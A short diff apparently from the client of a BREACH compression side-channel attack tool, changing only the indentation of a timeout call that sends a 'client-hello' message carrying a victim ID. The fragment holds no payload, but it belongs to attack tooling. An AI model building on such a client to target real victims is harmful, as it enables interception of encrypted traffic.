@@ -38,7 +38,7 @@ var BREACHClient = {
             setTimeout(function(){
 		this._socket.emit('client-hello', {
 			victim_id: config.VICTIM_ID})}.bind(this),
-	    this.MORE_WORK_TIMEOUT);
+	     this.MORE_WORK_TIMEOUT);
 	}
     },
     doWork(work) {
